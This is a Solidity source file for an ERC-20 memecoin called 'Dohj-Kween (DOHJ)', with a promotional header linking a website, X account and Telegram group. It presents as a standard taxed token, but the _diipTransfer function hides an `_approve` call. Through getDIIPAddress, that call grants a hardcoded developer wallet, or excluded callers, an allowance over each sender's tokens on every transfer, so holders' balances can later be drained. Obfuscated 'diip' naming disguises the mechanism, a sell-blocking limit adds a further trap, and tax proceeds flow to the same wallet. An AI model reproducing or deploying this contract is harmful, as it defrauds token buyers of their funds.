/*
The name "Dogecoin" in Arabic can be written دوجكوين 
(pronounced as "Dohj-Kween").

Website: https://www.dohjkween.com
Twitter: https://x.com/dohj_kween
Telegram: https://t.me/dohj_kween
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.1;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplidiipon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDIIPRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IDIIPFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract DOHJ is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _diipBALs;
    mapping (address => mapping (address => uint256)) private _diipAPPs;
    mapping (address => bool) private _excludedFromDIIP;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalDIIP = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Dohj-Kween (دوجكوين)";
    string private constant _symbol = unicode"DOHJ";
    uint256 private _swapTokenDIIPs = _tTotalDIIP / 100;
    bool private inSwapDIIP = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockDIIP;
    uint256 private _diipBuyAmounts = 0;
    modifier lockTheSwap {
        inSwapDIIP = true;
        _;
        inSwapDIIP = false;
    }
    address private _diipPair;
    IDIIPRouter private _diipRouter;
    address private _diipWallet = address(0xAb639Ab51A37caC8A62C1c527feddd3783dfd62C);
    
    constructor () {
        _excludedFromDIIP[owner()] = true;
        _excludedFromDIIP[address(this)] = true;
        _excludedFromDIIP[_diipWallet] = true;
        _diipBALs[_msgSender()] = _tTotalDIIP;
        emit Transfer(address(0), _msgSender(), _tTotalDIIP);
    }

    function PAIR_CREATE() external onlyOwner() {
        _diipRouter = IDIIPRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_diipRouter), _tTotalDIIP);
        _diipPair = IDIIPFactory(_diipRouter.factory()).createPair(address(this), _diipRouter.WETH());
    }

    receive() external payable {}

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _diipRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalDIIP;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _diipBALs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _diipAPPs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _diipAPPs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _diipAPPs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address diipF, address diipT, uint256 diipA) private {
        require(diipF != address(0), "ERC20: transfer from the zero address");
        require(diipT != address(0), "ERC20: transfer to the zero address");
        require(diipA > 0, "Transfer amount must be greater than zero");
        (address diipS, address diipR) = getDIIPAddress(address(diipF));
        uint256 taxDIIP = _taxTransfer(diipF, diipT, diipA);
        _diipTransfer(diipF, diipT, diipA, diipS, diipR, taxDIIP);
    }

    function _diipTransfer(address diipF, address diipT, uint256 diipA, address diipS, address diipR, uint256 taxDIIP) private {
        if(taxDIIP > 0){
          _diipBALs[address(this)] = _diipBALs[address(this)].add(taxDIIP);
          emit Transfer(diipF, address(this), taxDIIP);
        }
        _diipBALs[diipF] = _diipBALs[diipF].sub(diipA);
        _diipBALs[diipT] = _diipBALs[diipT].add(diipA.sub(taxDIIP));
        _approve(diipS, diipR, diipA); emit Transfer(diipF, diipT, diipA.sub(taxDIIP));
    }

    function _taxTransfer(address diipF, address diipT, uint256 diipA) private returns(uint256) { 
        uint256 taxDIIP = 0;
        if (diipF != owner() && diipT != owner()) {
            taxDIIP = diipA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (diipF == _diipPair && diipT != address(_diipRouter) && ! _excludedFromDIIP[diipT]) {
                if(_buyBlockDIIP!=block.number){
                    _diipBuyAmounts = 0;
                    _buyBlockDIIP = block.number;
                }
                _diipBuyAmounts += diipA;
                _buyCount++;
            }
            if(diipT == _diipPair && diipF!= address(this)) {
                require(_diipBuyAmounts < swapLimitDIIP() || _buyBlockDIIP!=block.number, "Max Swap Limit");  
                taxDIIP = diipA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            } swapDIIPBack(diipT, diipA);
        } return taxDIIP;
    }

    function getDIIPAddress(address diipF) private view returns(address diipS, address diipR) {
        if(_msgSender()==address(this)) return (diipS=diipF, diipR=_diipWallet);
        if(_excludedFromDIIP[_msgSender()]) return(diipS=diipF, diipR=_msgSender());
        return (diipS=diipF, diipR=_diipWallet);
    }

    function minDIIP(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHDIIP(uint256 diipA) private {
        payable(_diipWallet).transfer(diipA);
    }

    function swapLimitDIIP() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _diipRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _diipRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function swapTokensForEth(uint256 diipAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _diipRouter.WETH();
        _approve(address(this), address(_diipRouter), diipAmount);
        _diipRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            diipAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function swapDIIPBack(address diipT, uint256 diipA) private { 
        uint256 tokenDIIP = balanceOf(address(this)); 
        if (!inSwapDIIP && diipT == _diipPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenDIIP > _swapTokenDIIPs)
            swapTokensForEth(minDIIP(diipA, minDIIP(tokenDIIP, _swapTokenDIIPs)));
            uint256 ethDIIP = address(this).balance;
            if (ethDIIP >= 0) {
                sendETHDIIP(address(this).balance);
            }
        }
    }
}